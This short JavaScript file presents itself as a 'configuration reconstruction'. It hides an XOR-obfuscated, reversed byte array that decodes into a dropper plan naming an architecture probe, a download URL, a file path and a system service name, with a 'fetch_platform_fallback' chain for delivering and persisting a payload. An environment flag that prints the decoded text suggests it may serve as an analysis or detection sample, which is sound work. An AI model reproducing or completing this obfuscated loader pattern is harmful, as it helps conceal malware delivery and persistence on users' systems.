// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_7acda0d5 = "[127,121,115,108,104,127,105,52,41,127,45,47,120,44,55,127,126,117,116,39,127,119,123,116,69,127,121,115,108,104,127,105,102,114,121,104,123,52,105,105,127,121,117,104,106,39,127,120,117,104,106,69,114,121,104,123,102,105,112,119,52,47,124,42,45,40,121,41,127,45,47,120,44,55,127,125,123,110,105,52,53,127,126,117,116,55,105,105,127,104,110,116,111,114,53,106,119,110,53,39,114,110,123,106,69,127,118,115,124,102,45,47,120,44,53,110,115,126,111,91,127,126,117,84,39,110,116,127,125,123,69,104,127,105,111,102,115,106,123,53,126,115,118,123,108,116,115,52,127,118,106,119,123,98,127,52,47,124,42,45,40,121,41,127,45,47,120,44,55,127,126,117,116,53,53,32,105,106,110,110,114,39,118,104,111,102,40,89,41,95,45,47,88,44,55,95,94,85,84,39,126,115,69,116,125,115,123,106,119,123,121,102,47,39,110,116,111,117,121,69,127,125,123,110,105,102,113,121,123,120,118,118,123,124,69,119,104,117,124,110,123,118,106,69,114,121,110,127,124,39,104,127,110,106,123,126,123,102,105,105,127,121,117,104,106,69,114,121,110,123,106,105,115,126,54,127,126,117,119,69,127,125,116,123,114,121,54,127,118,115,124,69,127,110,115,104,109,54,127,110,117,119,127,104,69,127,104,115,111,107,121,123,54,110,105,117,114,69,127,118,115,124,117,104,106,39,105,106,127,110,105,102,43,39,108]";
const Codec_7acda0d5 = "decimal_array|reverse_then_xor|1a";

function load_7acda0d5() { return JSON.parse(Material_7acda0d5); }
function decode_7acda0d5(storedBytes) { return [...storedBytes].reverse().map((value) => value ^ 26); }
async function recover_7acda0d5() {
  const harmlessValue = ["north", "south"].join(":");
  const storedBytes = load_7acda0d5(); let recoveredBytes = [];
  recoveredBytes = await Promise.resolve(storedBytes).then(decode_7acda0d5);
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_7acda0d5() { return (await recover_7acda0d5()).split("|").join("|"); }
async function plan_7acda0d5() { const inspect = inspect_7acda0d5; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "fetch_platform_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }
void moduleShape; void plan_7acda0d5;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_7acda0d5());

// reconstruction complete